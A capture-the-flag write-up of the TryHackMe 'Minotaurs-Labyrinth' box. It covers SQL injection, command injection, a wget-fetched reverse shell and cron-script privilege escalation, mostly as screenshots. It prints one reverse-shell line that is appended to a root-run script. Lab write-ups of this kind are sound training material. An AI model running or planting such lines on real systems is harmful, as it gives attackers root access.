---
title: Minotaurs-Labyrinth TryHackMe Writeup
tags: [writeup,tryhackme,linux,time-based,api,command-injection,sql-injection]
style: border
color: success
description: ""
---


![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Minotaurs-Labyrinth/1.png)

## Scanning
We run nmap on all ports with scripts and software versions.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Minotaurs-Labyrinth/2.png)

## Enumeration
In the nmap, we see that there is an *FTP* that can be accessed anonymously, we mount the ftp in our kali and list the first flag.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Minotaurs-Labyrinth/14.png)

We found the website, tried default credentials, but nothing.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Minotaurs-Labyrinth/3.png)

We reviewed the source code, found a few comments that might be useful (or fake). We are interested in the "**login.js**" file.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Minotaurs-Labyrinth/4.png)

#### Content of login.js file

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Minotaurs-Labyrinth/5.png)

## Exploitation
We have a comment where comes the password of the user "**Daedalus**", we make the substitution of the arrays and we obtain the credentials.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Minotaurs-Labyrinth/6.png)

We check that the site is vulnerable to SQL Injection (Time-based).

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Minotaurs-Labyrinth/8.png)

#### We obtain databases
![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Minotaurs-Labyrinth/9.png)

#### We obtain tables
![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Minotaurs-Labyrinth/10.png)

#### We obtain People columns
![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Minotaurs-Labyrinth/11.png)

We obtain the flat password using the hash.
![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Minotaurs-Labyrinth/12.png)

We access with the administrator credentials and find a flag.
![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Minotaurs-Labyrinth/13.png)

We find the secret section, we see that we can execute the **ECHO** command from this **PHP** application.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Minotaurs-Labyrinth/15.png)

#### Testing
![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Minotaurs-Labyrinth/16.png)

We tried to bypass it with `command`.

#### PoC
![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Minotaurs-Labyrinth/17.png)

#### Read /etc/passwd
![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Minotaurs-Labyrinth/18.png)

#### Reverse shell
We create a file with our reverse shell "*m3.sh*", download it with "**wget**" on the victim machine, give it execution permissions and execute it.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Minotaurs-Labyrinth/19.png)

#### Executing file m3.sh

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Minotaurs-Labyrinth/20.png)

We check the version of python installed and configure the terminal to have a more interactive session.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Minotaurs-Labyrinth/21.png)

We are looking for the location of the remaining flags.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Minotaurs-Labyrinth/22.png)

#### Read user.txt file

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Minotaurs-Labyrinth/23.png)

## Privilege Escalation
We see the following folder which is not common on a Linux system. Inside, there is a file with a script, it may be running from time to time.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Minotaurs-Labyrinth/25.png)

We download **pspy64**, run it and see how the user "*root (UID=0)*" is running the script every so often.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Minotaurs-Labyrinth/27.png)

We add the following line to the file "**timer.sh**" to get a shell with the user that executes the file.

```bash
echo "bash -i >& /dev/tcp/XX.XX.XX.XX/555 0>&1" >> timer.sh
```

We wait a few minutes and we will get a shell as root and read the flag.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Minotaurs-Labyrinth/26.png)




